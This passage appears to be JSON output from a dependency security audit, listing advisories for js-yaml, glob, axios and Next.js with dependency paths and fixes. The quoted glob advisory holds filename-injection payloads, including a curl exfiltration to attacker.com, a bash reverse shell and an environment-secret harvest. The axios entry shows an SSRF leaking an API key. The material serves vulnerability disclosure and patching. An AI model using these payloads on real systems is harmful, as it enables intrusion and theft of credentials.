      "github_advisory_id": "GHSA-mh29-5h37-fv8m",
      "recommendation": "Upgrade to version 3.14.2 or later",
      "patched_versions": ">=3.14.2",
      "updated": "2025-11-17T15:20:44.000Z",
      "cvss": {
        "score": 5.3,
        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N"
      },
      "cwe": [
        "CWE-1321"
      ],
      "url": "https://github.com/advisories/GHSA-mh29-5h37-fv8m"
    },
    "1109802": {
      "findings": [
        {
          "version": "4.1.0",
          "paths": [
            ". > @typescript-eslint/eslint-plugin@6.17.0 > @typescript-eslint/parser@6.17.0 > eslint@8.56.0 > @eslint/eslintrc@2.1.4 > js-yaml@4.1.0",
            ". > @typescript-eslint/eslint-plugin@6.17.0 > @typescript-eslint/type-utils@6.17.0 > @typescript-eslint/utils@6.17.0 > @eslint-community/eslint-utils@4.7.0 > eslint@8.56.0 > @eslint/eslintrc@2.1.4 > js-yaml@4.1.0",
            ". > @typescript-eslint/eslint-plugin@6.17.0 > @typescript-eslint/type-utils@6.17.0 > @typescript-eslint/utils@6.17.0 > eslint@8.56.0 > @eslint/eslintrc@2.1.4 > js-yaml@4.1.0",
            ". > @typescript-eslint/eslint-plugin@6.17.0 > @typescript-eslint/type-utils@6.17.0 > eslint@8.56.0 > @eslint/eslintrc@2.1.4 > js-yaml@4.1.0",
            ". > @typescript-eslint/eslint-plugin@6.17.0 > @typescript-eslint/utils@6.17.0 > @eslint-community/eslint-utils@4.7.0 > eslint@8.56.0 > @eslint/eslintrc@2.1.4 > js-yaml@4.1.0",
            ". > @typescript-eslint/eslint-plugin@6.17.0 > @typescript-eslint/utils@6.17.0 > eslint@8.56.0 > @eslint/eslintrc@2.1.4 > js-yaml@4.1.0",
            ". > @typescript-eslint/eslint-plugin@6.17.0 > eslint@8.56.0 > @eslint/eslintrc@2.1.4 > js-yaml@4.1.0",
            ". > @typescript-eslint/parser@6.17.0 > eslint@8.56.0 > @eslint/eslintrc@2.1.4 > js-yaml@4.1.0",
            ". > eslint@8.56.0 > @eslint/eslintrc@2.1.4 > js-yaml@4.1.0",
            ". > eslint-config-prettier@9.1.2 > eslint@8.56.0 > @eslint/eslintrc@2.1.4 > js-yaml@4.1.0",
            ". > eslint-plugin-react@7.37.5 > eslint@8.56.0 > @eslint/eslintrc@2.1.4 > js-yaml@4.1.0",
            ". > eslint-plugin-react-hooks@4.6.2 > eslint@8.56.0 > @eslint/eslintrc@2.1.4 > js-yaml@4.1.0",
            "apps\\web-frontend > @typescript-eslint/eslint-plugin@6.17.0 > @typescript-eslint/parser@6.17.0 > eslint@8.56.0 > @eslint/eslintrc@2.1.4 > js-yaml@4.1.0",
            "apps\\web-frontend > @typescript-eslint/eslint-plugin@6.17.0 > @typescript-eslint/type-utils@6.17.0 > @typescript-eslint/utils@6.17.0 > @eslint-community/eslint-utils@4.7.0 > eslint@8.56.0 > @eslint/eslintrc@2.1.4 > js-yaml@4.1.0",
            "apps\\web-frontend > @typescript-eslint/eslint-plugin@6.17.0 > @typescript-eslint/type-utils@6.17.0 > @typescript-eslint/utils@6.17.0 > eslint@8.56.0 > @eslint/eslintrc@2.1.4 > js-yaml@4.1.0",
            "apps\\web-frontend > @typescript-eslint/eslint-plugin@6.17.0 > @typescript-eslint/type-utils@6.17.0 > eslint@8.56.0 > @eslint/eslintrc@2.1.4 > js-yaml@4.1.0",
            "apps\\web-frontend > @typescript-eslint/eslint-plugin@6.17.0 > @typescript-eslint/utils@6.17.0 > @eslint-community/eslint-utils@4.7.0 > eslint@8.56.0 > @eslint/eslintrc@2.1.4 > js-yaml@4.1.0",
            "apps\\web-frontend > @typescript-eslint/eslint-plugin@6.17.0 > @typescript-eslint/utils@6.17.0 > eslint@8.56.0 > @eslint/eslintrc@2.1.4 > js-yaml@4.1.0",
            "apps\\web-frontend > @typescript-eslint/eslint-plugin@6.17.0 > eslint@8.56.0 > @eslint/eslintrc@2.1.4 > js-yaml@4.1.0",
            "apps\\web-frontend > @typescript-eslint/parser@6.17.0 > eslint@8.56.0 > @eslint/eslintrc@2.1.4 > js-yaml@4.1.0",
            "apps\\web-frontend > eslint@8.56.0 > @eslint/eslintrc@2.1.4 > js-yaml@4.1.0",
            "apps\\web-frontend > eslint-config-next@16.0.6 > eslint@8.56.0 > @eslint/eslintrc@2.1.4 > js-yaml@4.1.0",
            "apps\\web-frontend > eslint-config-next@16.0.6 > eslint-import-resolver-typescript@3.10.1 > eslint@8.56.0 > @eslint/eslintrc@2.1.4 > js-yaml@4.1.0",
            "apps\\web-frontend > eslint-config-next@16.0.6 > eslint-import-resolver-typescript@3.10.1 > eslint-plugin-import@2.32.0 > @typescript-eslint/parser@6.17.0 > eslint@8.56.0 > @eslint/eslintrc@2.1.4 > js-yaml@4.1.0",
            "apps\\web-frontend > eslint-config-next@16.0.6 > eslint-import-resolver-typescript@3.10.1 > eslint-plugin-import@2.32.0 > eslint@8.56.0 > @eslint/eslintrc@2.1.4 > js-yaml@4.1.0",
            "apps\\web-frontend > eslint-config-next@16.0.6 > eslint-import-resolver-typescript@3.10.1 > eslint-plugin-import@2.32.0 > eslint-module-utils@2.12.1 > @typescript-eslint/parser@6.17.0 > eslint@8.56.0 > @eslint/eslintrc@2.1.4 > js-yaml@4.1.0",
            "apps\\web-frontend > eslint-config-next@16.0.6 > eslint-import-resolver-typescript@3.10.1 > eslint-plugin-import@2.32.0 > eslint-module-utils@2.12.1 > eslint@8.56.0 > @eslint/eslintrc@2.1.4 > js-yaml@4.1.0",
            "apps\\web-frontend > eslint-config-next@16.0.6 > eslint-plugin-import@2.32.0 > @typescript-eslint/parser@6.17.0 > eslint@8.56.0 > @eslint/eslintrc@2.1.4 > js-yaml@4.1.0",
            "apps\\web-frontend > eslint-config-next@16.0.6 > eslint-plugin-import@2.32.0 > eslint@8.56.0 > @eslint/eslintrc@2.1.4 > js-yaml@4.1.0",
            "apps\\web-frontend > eslint-config-next@16.0.6 > eslint-plugin-import@2.32.0 > eslint-module-utils@2.12.1 > @typescript-eslint/parser@6.17.0 > eslint@8.56.0 > @eslint/eslintrc@2.1.4 > js-yaml@4.1.0",
            "apps\\web-frontend > eslint-config-next@16.0.6 > eslint-plugin-import@2.32.0 > eslint-module-utils@2.12.1 > eslint@8.56.0 > @eslint/eslintrc@2.1.4 > js-yaml@4.1.0",
            "apps\\web-frontend > eslint-config-next@16.0.6 > eslint-plugin-jsx-a11y@6.10.2 > eslint@8.56.0 > @eslint/eslintrc@2.1.4 > js-yaml@4.1.0",
            "apps\\web-frontend > eslint-config-next@16.0.6 > eslint-plugin-react@7.37.5 > eslint@8.56.0 > @eslint/eslintrc@2.1.4 > js-yaml@4.1.0",
            "apps\\web-frontend > eslint-config-next@16.0.6 > eslint-plugin-react-hooks@7.0.1 > eslint@8.56.0 > @eslint/eslintrc@2.1.4 > js-yaml@4.1.0",
            "apps\\web-frontend > eslint-config-next@16.0.6 > typescript-eslint@8.49.0 > @typescript-eslint/eslint-plugin@8.49.0 > @typescript-eslint/parser@8.49.0 > eslint@8.56.0 > @eslint/eslintrc@2.1.4 > js-yaml@4.1.0",
            "apps\\web-frontend > eslint-config-next@16.0.6 > typescript-eslint@8.49.0 > @typescript-eslint/eslint-plugin@8.49.0 > @typescript-eslint/type-utils@8.49.0 > @typescript-eslint/utils@8.49.0 > eslint@8.56.0 > @eslint/eslintrc@2.1.4 > js-yaml@4.1.0",
            "apps\\web-frontend > eslint-config-next@16.0.6 > typescript-eslint@8.49.0 > @typescript-eslint/eslint-plugin@8.49.0 > @typescript-eslint/type-utils@8.49.0 > eslint@8.56.0 > @eslint/eslintrc@2.1.4 > js-yaml@4.1.0",
            "apps\\web-frontend > eslint-config-next@16.0.6 > typescript-eslint@8.49.0 > @typescript-eslint/eslint-plugin@8.49.0 > @typescript-eslint/utils@8.49.0 > eslint@8.56.0 > @eslint/eslintrc@2.1.4 > js-yaml@4.1.0",
            "apps\\web-frontend > eslint-config-next@16.0.6 > typescript-eslint@8.49.0 > @typescript-eslint/eslint-plugin@8.49.0 > eslint@8.56.0 > @eslint/eslintrc@2.1.4 > js-yaml@4.1.0",
            "apps\\web-frontend > eslint-config-next@16.0.6 > typescript-eslint@8.49.0 > @typescript-eslint/parser@8.49.0 > eslint@8.56.0 > @eslint/eslintrc@2.1.4 > js-yaml@4.1.0",
            "apps\\web-frontend > eslint-config-next@16.0.6 > typescript-eslint@8.49.0 > @typescript-eslint/utils@8.49.0 > eslint@8.56.0 > @eslint/eslintrc@2.1.4 > js-yaml@4.1.0",
            "apps\\web-frontend > eslint-config-next@16.0.6 > typescript-eslint@8.49.0 > eslint@8.56.0 > @eslint/eslintrc@2.1.4 > js-yaml@4.1.0"
          ]
        }
      ],
      "found_by": null,
      "deleted": null,
      "references": "- https://github.com/nodeca/js-yaml/security/advisories/GHSA-mh29-5h37-fv8m\n- https://nvd.nist.gov/vuln/detail/CVE-2025-64718\n- https://github.com/nodeca/js-yaml/commit/383665ff4248ec2192d1274e934462bb30426879\n- https://github.com/nodeca/js-yaml/commit/5278870a17454fe8621dbd8c445c412529525266\n- https://github.com/advisories/GHSA-mh29-5h37-fv8m",
      "created": "2025-11-14T14:29:48.000Z",
      "id": 1109802,
      "npm_advisory_id": null,
      "overview": "### Impact\n\nIn js-yaml 4.1.0, 4.0.0, and 3.14.1 and below, it's possible for an attacker to modify the prototype of the result of a parsed yaml document via prototype pollution (`__proto__`). All users who parse untrusted yaml documents may be impacted.\n\n### Patches\n\nProblem is patched in js-yaml 4.1.1 and 3.14.2.\n\n### Workarounds\n\nYou can protect against this kind of attack on the server by using `node --disable-proto=delete` or `deno` (in Deno, pollution protection is on by default).\n\n### References\n\nhttps://cheatsheetseries.owasp.org/cheatsheets/Prototype_Pollution_Prevention_Cheat_Sheet.html",
      "reported_by": null,
      "title": "js-yaml has prototype pollution in merge (<<)",
      "metadata": null,
      "cves": [
        "CVE-2025-64718"
      ],
      "access": "public",
      "severity": "moderate",
      "module_name": "js-yaml",
      "vulnerable_versions": ">=4.0.0 <4.1.1",
      "github_advisory_id": "GHSA-mh29-5h37-fv8m",
      "recommendation": "Upgrade to version 4.1.1 or later",
      "patched_versions": ">=4.1.1",
      "updated": "2025-11-17T15:20:44.000Z",
      "cvss": {
        "score": 5.3,
        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N"
      },
      "cwe": [
        "CWE-1321"
      ],
      "url": "https://github.com/advisories/GHSA-mh29-5h37-fv8m"
    },
    "1109842": {
      "findings": [
        {
          "version": "10.4.5",
          "paths": [
            "lawclick-next > jest@30.2.0 > @jest/core@30.2.0 > @jest/reporters@30.2.0 > glob@10.4.5",
            "lawclick-next > jest@30.2.0 > @jest/core@30.2.0 > jest-config@30.2.0 > glob@10.4.5",
            "lawclick-next > jest@30.2.0 > @jest/core@30.2.0 > jest-config@30.2.0 > jest-circus@30.2.0 > jest-runtime@30.2.0 > glob@10.4.5",
            "lawclick-next > jest@30.2.0 > @jest/core@30.2.0 > jest-config@30.2.0 > jest-runner@30.2.0 > jest-runtime@30.2.0 > glob@10.4.5",
            "lawclick-next > jest@30.2.0 > @jest/core@30.2.0 > jest-runner@30.2.0 > jest-runtime@30.2.0 > glob@10.4.5",
            "lawclick-next > jest@30.2.0 > @jest/core@30.2.0 > jest-runtime@30.2.0 > glob@10.4.5",
            "lawclick-next > jest@30.2.0 > jest-cli@30.2.0 > @jest/core@30.2.0 > @jest/reporters@30.2.0 > glob@10.4.5",
            "lawclick-next > jest@30.2.0 > jest-cli@30.2.0 > @jest/core@30.2.0 > jest-config@30.2.0 > glob@10.4.5",
            "lawclick-next > jest@30.2.0 > jest-cli@30.2.0 > @jest/core@30.2.0 > jest-config@30.2.0 > jest-circus@30.2.0 > jest-runtime@30.2.0 > glob@10.4.5",
            "lawclick-next > jest@30.2.0 > jest-cli@30.2.0 > @jest/core@30.2.0 > jest-config@30.2.0 > jest-runner@30.2.0 > jest-runtime@30.2.0 > glob@10.4.5",
            "lawclick-next > jest@30.2.0 > jest-cli@30.2.0 > @jest/core@30.2.0 > jest-runner@30.2.0 > jest-runtime@30.2.0 > glob@10.4.5",
            "lawclick-next > jest@30.2.0 > jest-cli@30.2.0 > @jest/core@30.2.0 > jest-runtime@30.2.0 > glob@10.4.5",
            "lawclick-next > jest@30.2.0 > jest-cli@30.2.0 > jest-config@30.2.0 > glob@10.4.5",
            "lawclick-next > jest@30.2.0 > jest-cli@30.2.0 > jest-config@30.2.0 > jest-circus@30.2.0 > jest-runtime@30.2.0 > glob@10.4.5",
            "lawclick-next > jest@30.2.0 > jest-cli@30.2.0 > jest-config@30.2.0 > jest-runner@30.2.0 > jest-runtime@30.2.0 > glob@10.4.5",
            "lawclick-next > ts-jest@29.4.6 > jest@30.2.0 > @jest/core@30.2.0 > @jest/reporters@30.2.0 > glob@10.4.5",
            "lawclick-next > ts-jest@29.4.6 > jest@30.2.0 > @jest/core@30.2.0 > jest-config@30.2.0 > glob@10.4.5",
            "lawclick-next > ts-jest@29.4.6 > jest@30.2.0 > @jest/core@30.2.0 > jest-config@30.2.0 > jest-circus@30.2.0 > jest-runtime@30.2.0 > glob@10.4.5",
            "lawclick-next > ts-jest@29.4.6 > jest@30.2.0 > @jest/core@30.2.0 > jest-config@30.2.0 > jest-runner@30.2.0 > jest-runtime@30.2.0 > glob@10.4.5",
            "lawclick-next > ts-jest@29.4.6 > jest@30.2.0 > @jest/core@30.2.0 > jest-runner@30.2.0 > jest-runtime@30.2.0 > glob@10.4.5",
            "lawclick-next > ts-jest@29.4.6 > jest@30.2.0 > @jest/core@30.2.0 > jest-runtime@30.2.0 > glob@10.4.5",
            "lawclick-next > ts-jest@29.4.6 > jest@30.2.0 > jest-cli@30.2.0 > @jest/core@30.2.0 > @jest/reporters@30.2.0 > glob@10.4.5",
            "lawclick-next > ts-jest@29.4.6 > jest@30.2.0 > jest-cli@30.2.0 > @jest/core@30.2.0 > jest-config@30.2.0 > glob@10.4.5",
            "lawclick-next > ts-jest@29.4.6 > jest@30.2.0 > jest-cli@30.2.0 > @jest/core@30.2.0 > jest-config@30.2.0 > jest-circus@30.2.0 > jest-runtime@30.2.0 > glob@10.4.5",
            "lawclick-next > ts-jest@29.4.6 > jest@30.2.0 > jest-cli@30.2.0 > @jest/core@30.2.0 > jest-config@30.2.0 > jest-runner@30.2.0 > jest-runtime@30.2.0 > glob@10.4.5",
            "lawclick-next > ts-jest@29.4.6 > jest@30.2.0 > jest-cli@30.2.0 > @jest/core@30.2.0 > jest-runner@30.2.0 > jest-runtime@30.2.0 > glob@10.4.5",
            "lawclick-next > ts-jest@29.4.6 > jest@30.2.0 > jest-cli@30.2.0 > @jest/core@30.2.0 > jest-runtime@30.2.0 > glob@10.4.5",
            "lawclick-next > ts-jest@29.4.6 > jest@30.2.0 > jest-cli@30.2.0 > jest-config@30.2.0 > glob@10.4.5",
            "lawclick-next > ts-jest@29.4.6 > jest@30.2.0 > jest-cli@30.2.0 > jest-config@30.2.0 > jest-circus@30.2.0 > jest-runtime@30.2.0 > glob@10.4.5",
            "lawclick-next > ts-jest@29.4.6 > jest@30.2.0 > jest-cli@30.2.0 > jest-config@30.2.0 > jest-runner@30.2.0 > jest-runtime@30.2.0 > glob@10.4.5"
          ]
        }
      ],
      "found_by": null,
      "deleted": null,
      "references": "- https://github.com/isaacs/node-glob/security/advisories/GHSA-5j98-mcp5-4vw2\n- https://github.com/isaacs/node-glob/commit/47473c046b91c67269df7a66eab782a6c2716146\n- https://nvd.nist.gov/vuln/detail/CVE-2025-64756\n- https://github.com/isaacs/node-glob/commit/1e4e297342a09f2aa0ced87fcd4a70ddc325d75f\n- https://github.com/advisories/GHSA-5j98-mcp5-4vw2",
      "created": "2025-11-17T17:38:56.000Z",
      "id": 1109842,
      "npm_advisory_id": null,
      "overview": "### Summary\n\nThe glob CLI contains a command injection vulnerability in its `-c/--cmd` option that allows arbitrary command execution when processing files with malicious names. When `glob -c <command> <patterns>` is used, matched filenames are passed to a shell with `shell: true`, enabling shell metacharacters in filenames to trigger command injection and achieve arbitrary code execution under the user or CI account privileges.\n\n### Details\n\n**Root Cause:**\nThe vulnerability exists in `src/bin.mts:277` where the CLI collects glob matches and executes the supplied command using `foregroundChild()` with `shell: true`:\n\n```javascript\nstream.on('end', () => foregroundChild(cmd, matches, { shell: true }))\n```\n\n**Technical Flow:**\n1. User runs `glob -c <command> <pattern>` \n2. CLI finds files matching the pattern\n3. Matched filenames are collected into an array\n4. Command is executed with matched filenames as arguments using `shell: true`\n5. Shell interprets metacharacters in filenames as command syntax\n6. Malicious filenames execute arbitrary commands\n\n**Affected Component:**\n- **CLI Only:** The vulnerability affects only the command-line interface\n- **Library Safe:** The core glob library API (`glob()`, `globSync()`, streams/iterators) is not affected\n- **Shell Dependency:** Exploitation requires shell metacharacter support (primarily POSIX systems)\n\n**Attack Surface:**\n- Files with names containing shell metacharacters: `$()`, backticks, `;`, `&`, `|`, etc.\n- Any directory where attackers can control filenames (PR branches, archives, user uploads)\n- CI/CD pipelines using `glob -c` on untrusted content\n\n### PoC\n\n**Setup Malicious File:**\n```bash\nmkdir test_directory && cd test_directory\n\n# Create file with command injection payload in filename\ntouch '$(touch injected_poc)'\n```\n\n**Trigger Vulnerability:**\n```bash\n# Run glob CLI with -c option\nnode /path/to/glob/dist/esm/bin.mjs -c echo \"**/*\"\n```\n\n**Result:**\n- The echo command executes normally\n- **Additionally:** The `$(touch injected_poc)` in the filename is evaluated by the shell\n- A new file `injected_poc` is created, proving command execution\n- Any command can be injected this way with full user privileges\n\n**Advanced Payload Examples:**\n\n**Data Exfiltration:**\n```bash\n# Filename: $(curl -X POST https://attacker.com/exfil -d \"$(whoami):$(pwd)\" > /dev/null 2>&1)\ntouch '$(curl -X POST https://attacker.com/exfil -d \"$(whoami):$(pwd)\" > /dev/null 2>&1)'\n```\n\n**Reverse Shell:**\n```bash\n# Filename: $(bash -i >& /dev/tcp/attacker.com/4444 0>&1)\ntouch '$(bash -i >& /dev/tcp/attacker.com/4444 0>&1)'\n```\n\n**Environment Variable Harvesting:**\n```bash\n# Filename: $(env | grep -E \"(TOKEN|KEY|SECRET)\" > /tmp/secrets.txt)\ntouch '$(env | grep -E \"(TOKEN|KEY|SECRET)\" > /tmp/secrets.txt)'\n```\n\n### Impact\n\n**Arbitrary Command Execution:**\n- Commands execute with full privileges of the user running glob CLI\n- No privilege escalation required - runs as current user\n- Access to environment variables, file system, and network\n\n**Real-World Attack Scenarios:**\n\n**1. CI/CD Pipeline Compromise:**\n- Malicious PR adds files with crafted names to repository\n- CI pipeline uses `glob -c` to process files (linting, testing, deployment)\n- Commands execute in CI environment with build secrets and deployment credentials\n- Potential for supply chain compromise through artifact tampering\n\n**2. Developer Workstation Attack:**\n- Developer clones repository or extracts archive containing malicious filenames\n- Local build scripts use `glob -c` for file processing\n- Developer machine compromise with access to SSH keys, tokens, local services\n\n**3. Automated Processing Systems:**\n- Services using glob CLI to process uploaded files or external content\n- File uploads with malicious names trigger command execution\n- Server-side compromise with potential for lateral movement\n\n**4. Supply Chain Poisoning:**\n- Malicious packages or themes include files with crafted names\n- Build processes using glob CLI automatically process these files\n- Wide distribution of compromise through package ecosystems\n\n**Platform-Specific Risks:**\n- **POSIX/Linux/macOS:** High risk due to flexible filename characters and shell parsing\n- **Windows:** Lower risk due to filename restrictions, but vulnerability persists with PowerShell, Git Bash, WSL\n- **Mixed Environments:** CI systems often use Linux containers regardless of developer platform\n\n### Affected Products\n\n- **Ecosystem:** npm\n- **Package name:** glob\n- **Component:** CLI only (`src/bin.mts`)\n- **Affected versions:** v10.2.0 through v11.0.3 (and likely later versions until patched)\n- **Introduced:** v10.2.0 (first release with CLI containing `-c/--cmd` option)\n- **Patched versions:** 11.1.0and 10.5.0\n\n**Scope Limitation:**\n- **Library API Not Affected:** Core glob functions (`glob()`, `globSync()`, async iterators) are safe\n- **CLI-Specific:** Only the command-line interface with `-c/--cmd` option is vulnerable\n\n### Remediation\n\n- Upgrade to `glob@10.5.0`, `glob@11.1.0`, or higher, as soon as possible.\n- If any `glob` CLI actions fail, then convert commands containing positional arguments, to use the `--cmd-arg`/`-g` option instead.\n- As a last resort, use `--shell` to maintain `shell:true` behavior until glob v12, but take care to ensure that no untrusted contents can possibly be encountered in the file path results.",
      "reported_by": null,
      "title": "glob CLI: Command injection via -c/--cmd executes matches with shell:true",
      "metadata": null,
      "cves": [
        "CVE-2025-64756"
      ],
      "access": "public",
      "severity": "high",
      "module_name": "glob",
      "vulnerable_versions": ">=10.2.0 <10.5.0",
      "github_advisory_id": "GHSA-5j98-mcp5-4vw2",
      "recommendation": "Upgrade to version 10.5.0 or later",
      "patched_versions": ">=10.5.0",
      "updated": "2025-11-19T02:30:53.000Z",
      "cvss": {
        "score": 7.5,
        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H"
      },
      "cwe": [
        "CWE-78"
      ],
      "url": "https://github.com/advisories/GHSA-5j98-mcp5-4vw2"
    },
    "1111035": {
      "findings": [
        {
          "version": "1.6.2",
          "paths": [
            "apps\\web-frontend > axios@1.6.2"
          ]
        }
      ],
      "found_by": null,
      "deleted": null,
      "references": "- https://github.com/axios/axios/security/advisories/GHSA-jr5f-v2jv-69x6\n- https://github.com/axios/axios/issues/6463\n- https://github.com/axios/axios/commit/fb8eec214ce7744b5ca787f2c3b8339b2f54b00f\n- https://github.com/axios/axios/releases/tag/v1.8.2\n- https://nvd.nist.gov/vuln/detail/CVE-2025-27152\n- https://github.com/axios/axios/pull/6829\n- https://github.com/axios/axios/commit/02c3c69ced0f8fd86407c23203835892313d7fde\n- https://github.com/advisories/GHSA-jr5f-v2jv-69x6",
      "created": "2025-03-07T15:16:00.000Z",
      "id": 1111035,
      "npm_advisory_id": null,
      "overview": "### Summary\n\nA previously reported issue in axios demonstrated that using protocol-relative URLs could lead to SSRF (Server-Side Request Forgery). Reference: axios/axios#6463\n\nA similar problem that occurs when passing absolute URLs rather than protocol-relative URLs to axios has been identified. Even if ⁠`baseURL` is set, axios sends the request to the specified absolute URL, potentially causing SSRF and credential leakage. This issue impacts both server-side and client-side usage of axios.\n\n### Details\n\nConsider the following code snippet:\n\n```js\nimport axios from \"axios\";\n\nconst internalAPIClient = axios.create({\n  baseURL: \"http://example.test/api/v1/users/\",\n  headers: {\n    \"X-API-KEY\": \"1234567890\",\n  },\n});\n\n// const userId = \"123\";\nconst userId = \"http://attacker.test/\";\n\nawait internalAPIClient.get(userId); // SSRF\n```\n\nIn this example, the request is sent to `http://attacker.test/` instead of the `baseURL`. As a result, the domain owner of `attacker.test` would receive the `X-API-KEY` included in the request headers.\n\nIt is recommended that:\n\n-\tWhen `baseURL` is set, passing an absolute URL such as `http://attacker.test/` to `get()` should not ignore `baseURL`.\n-\tBefore sending the HTTP request (after combining the `baseURL` with the user-provided parameter), axios should verify that the resulting URL still begins with the expected `baseURL`.\n\n### PoC\n\nFollow the steps below to reproduce the issue:\n\n1.\tSet up two simple HTTP servers:\n\n```\nmkdir /tmp/server1 /tmp/server2\necho \"this is server1\" > /tmp/server1/index.html \necho \"this is server2\" > /tmp/server2/index.html\npython -m http.server -d /tmp/server1 10001 &\npython -m http.server -d /tmp/server2 10002 &\n```\n\n\n2.\tCreate a script (e.g., main.js):\n\n```js\nimport axios from \"axios\";\nconst client = axios.create({ baseURL: \"http://localhost:10001/\" });\nconst response = await client.get(\"http://localhost:10002/\");\nconsole.log(response.data);\n```\n\n3.\tRun the script:\n\n```\n$ node main.js\nthis is server2\n```\n\nEven though `baseURL` is set to `http://localhost:10001/`, axios sends the request to `http://localhost:10002/`.\n\n### Impact\n\n-\tCredential Leakage: Sensitive API keys or credentials (configured in axios) may be exposed to unintended third-party hosts if an absolute URL is passed.\n-\tSSRF (Server-Side Request Forgery): Attackers can send requests to other internal hosts on the network where the axios program is running.\n-\tAffected Users: Software that uses `baseURL` and does not validate path parameters is affected by this issue.",
      "reported_by": null,
      "title": "axios Requests Vulnerable To Possible SSRF and Credential Leakage via Absolute URL",
      "metadata": null,
      "cves": [
        "CVE-2025-27152"
      ],
      "access": "public",
      "severity": "high",
      "module_name": "axios",
      "vulnerable_versions": ">=1.0.0 <1.8.2",
      "github_advisory_id": "GHSA-jr5f-v2jv-69x6",
      "recommendation": "Upgrade to version 1.8.2 or later",
      "patched_versions": ">=1.8.2",
      "updated": "2025-11-27T08:44:29.000Z",
      "cvss": {
        "score": 0,
        "vectorString": null
      },
      "cwe": [
        "CWE-918"
      ],
      "url": "https://github.com/advisories/GHSA-jr5f-v2jv-69x6"
    },
    "1111368": {
      "findings": [
        {
          "version": "16.0.6",
          "paths": [
            "apps\\web-frontend > next@16.0.6",
            "lawclick-next > next@16.0.6",
            "lawclick-next > next-auth@5.0.0-beta.30 > next@16.0.6"
          ]
        }
      ],
      "found_by": null,
      "deleted": null,
      "references": "- https://github.com/vercel/next.js/security/advisories/GHSA-9qr9-h5gf-34mp\n- https://nvd.nist.gov/vuln/detail/CVE-2025-55182\n- https://github.com/facebook/react/security/advisories/GHSA-fv66-9v8q-g76r\n- https://github.com/vitejs/vite-plugin-react/security/advisories/GHSA-fmh4-wr37-44fp\n- https://github.com/advisories/GHSA-9qr9-h5gf-34mp",
      "created": "2025-12-03T19:07:11.000Z",
      "id": 1111368,
      "npm_advisory_id": null,
      "overview": "A vulnerability affects certain React packages<sup>1</sup> for versions 19.0.0, 19.1.0, 19.1.1, and 19.2.0 and frameworks that use the affected packages, including Next.js 15.x and 16.x using the App Router. The issue is tracked upstream as [CVE-2025-55182](https://www.cve.org/CVERecord?id=CVE-2025-55182). \n\nFixed in:\nReact: 19.0.1, 19.1.2, 19.2.1\nNext.js: 15.0.5, 15.1.9, 15.2.6, 15.3.6, 15.4.8, 15.5.7, 16.0.7, 15.6.0-canary.58, 16.1.0-canary.12+\n\nThe vulnerability also affects experimental canary releases starting with 14.3.0-canary.77. Users on any of the 14.3 canary builds should either downgrade to a 14.x stable release or 14.3.0-canary.76.\n\nAll users of stable 15.x or 16.x Next.js versions should upgrade to a patched, stable version immediately.\n\n<sup>1</sup> The affected React packages are:\n- react-server-dom-parcel\n- react-server-dom-turbopack\n- react-server-dom-webpack",
      "reported_by": null,
      "title": "Next.js is vulnerable to RCE in React flight protocol",
      "metadata": null,
      "cves": [],
      "access": "public",
      "severity": "critical",
      "module_name": "next",
      "vulnerable_versions": ">=16.0.0-canary.0 <16.0.7",
      "github_advisory_id": "GHSA-9qr9-h5gf-34mp",
      "recommendation": "Upgrade to version 16.0.7 or later",
      "patched_versions": ">=16.0.7",
      "updated": "2025-12-11T19:31:08.000Z",
      "cvss": {
        "score": 10,
        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H"
      },
      "cwe": [
        "CWE-502"
      ],
      "url": "https://github.com/advisories/GHSA-9qr9-h5gf-34mp"
    },
    "1111374": {
      "findings": [
        {
          "version": "16.0.6",
          "paths": [
            "apps\\web-frontend > next@16.0.6",
            "lawclick-next > next@16.0.6",
            "lawclick-next > next-auth@5.0.0-beta.30 > next@16.0.6"
          ]
        }
      ],
      "found_by": null,
      "deleted": null,
      "references": "- https://github.com/vercel/next.js/security/advisories/GHSA-w37m-7fhw-fmv9\n- https://nextjs.org/blog/security-update-2025-12-11\n- https://www.cve.org/CVERecord?id=CVE-2025-55183\n- https://github.com/advisories/GHSA-w37m-7fhw-fmv9",
      "created": "2025-12-11T22:49:56.000Z",
      "id": 1111374,
      "npm_advisory_id": null,
      "overview": "A vulnerability affects certain React packages for versions 19.0.0, 19.0.1, 19.1.0, 19.1.1, 19.1.2, 19.2.0, and 19.2.1 and frameworks that use the affected packages, including Next.js 15.x and 16.x using the App Router. The issue is tracked upstream as [CVE-2025-55183](https://www.cve.org/CVERecord?id=CVE-2025-55183).\n\nA malicious HTTP request can be crafted and sent to any App Router endpoint that can return the compiled source code of [Server Functions](https://react.dev/reference/rsc/server-functions). This could reveal business logic, but would not expose secrets unless they were hardcoded directly into [Server Function](https://react.dev/reference/rsc/server-functions) code.",
      "reported_by": null,
      "title": "Next Server Actions Source Code Exposure ",
      "metadata": null,
      "cves": [],
      "access": "public",
      "severity": "moderate",
      "module_name": "next",
      "vulnerable_versions": ">=16.0.0-beta.0 <16.0.9",
      "github_advisory_id": "GHSA-w37m-7fhw-fmv9",
      "recommendation": "Upgrade to version 16.0.9 or later",
      "patched_versions": ">=16.0.9",
      "updated": "2025-12-11T22:49:56.000Z",
      "cvss": {
        "score": 5.3,
        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N"
      },
      "cwe": [
        "CWE-497",
        "CWE-502",
        "CWE-1395"
      ],
      "url": "https://github.com/advisories/GHSA-w37m-7fhw-fmv9"
    },
    "1111383": {
      "findings": [
        {
          "version": "16.0.6",
          "paths": [
            "apps\\web-frontend > next@16.0.6",
            "lawclick-next > next@16.0.6",
            "lawclick-next > next-auth@5.0.0-beta.30 > next@16.0.6"
          ]
        }
      ],
      "found_by": null,
      "deleted": null,
      "references": "- https://github.com/vercel/next.js/security/advisories/GHSA-mwv6-3258-q52c\n- https://nextjs.org/blog/security-update-2025-12-11\n- https://www.cve.org/CVERecord?id=CVE-2025-55184\n- https://github.com/advisories/GHSA-mwv6-3258-q52c",
      "created": "2025-12-11T22:49:27.000Z",
      "id": 1111383,
      "npm_advisory_id": null,
